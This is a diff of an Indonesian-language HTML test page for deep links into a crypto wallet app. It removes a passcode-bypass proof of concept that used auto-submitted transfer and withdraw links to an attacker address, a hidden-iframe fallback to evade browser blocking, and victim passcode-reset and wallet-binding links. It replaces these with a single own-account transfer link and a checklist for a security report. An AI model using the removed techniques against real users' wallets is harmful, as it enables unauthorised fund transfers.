@@ -1,46 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Deep-link Test - Ult App</title>
+<title>Ult App - Safe Deep-link Check</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body style="font-family:sans-serif; padding:20px">
-<h2>Ult App Deep-link PoC</h2>
-<p>Ini untuk test apakah bisa skip passcode gate</p>
+<h2>Safe Deep-link Check - Akun Milik Sendiri</h2>
+<p>Hanya untuk cek apakah layar konfirmasi + passcode muncul. Tidak ada auto_submit.</p>
 
-<button onclick="test('transfer')">Test Transfer Deep-link</button>
-<button onclick="test('withdraw')">Test Withdraw Deep-link</button>
-<button onclick="test('qr')">Test QR Payload</button>
+<!-- Ganti dengan WALLET_B milikmu sendiri -->
+<a href="ultapp://transfer?to=0x7b0c4918c4148f502cD431C5B2b99D92637c8d1b&amount=0.001&asset=CRO">
+  Buka Layar Transfer (harus minta konfirmasi + passcode)
+</a>
 
-<script>
-function test(type) {
-  // GANTI alamat ini dengan alamat wallet akun ke-2 kamu sendiri
-  const attackerAddress = "0xYOUR_OWN_WALLET_2";
-
-  let urls = {
-    transfer: `ultapp://transfer?to=${attackerAddress}&amount=0.001&asset=CRO&auto_submit=true`,
-    withdraw: `ultapp://withdraw?to=${attackerAddress}&amount=0.001&asset=CRO`,
-    qr: `https://ult.com/qr?data=ultapp://transfer?to=${attackerAddress}&amount=1000`
-  };
-
-  // Universal Link + Custom Scheme, 2 metode
-  console.log("Trying: " + urls[type]);
-  window.location.href = urls[type];
-
-  // fallback iframe untuk bypass browser block
-  setTimeout(() => {
-    let iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = urls[type];
-    document.body.appendChild(iframe);
-  }, 500);
-}
-</script>
-
-<h3>Manual Links:</h3>
-<a href="ultapp://transfer?to=0xYOUR_OWN_WALLET_2&amount=0.001&asset=CRO">Link Transfer Manual</a><br><br>
-<a href="ultapp://settings/reset-passcode?user_id=VICTIM_ID">Test Reset Passcode Victim</a><br><br>
-<a href="ultapp://onboarding/bind-wallet?wallet_id=ATTACKER_WALLET">Test Wallet Binding Confusion</a>
-
+<p>Yang harus kamu rekam untuk laporan:</p>
+<ol>
+  <li>Tap link di atas</li>
+  <li>Apakah app menampilkan detail penerima, jumlah, asset dengan jelas?</li>
+  <li>Apakah layar passcode/biometrik muncul sebelum signing?</li>
+  <li>Di Burp, apakah request ke api.cronos.com butuh passcode_verification_token yang fresh?</li>
+</ol>
 </body>
 </html>
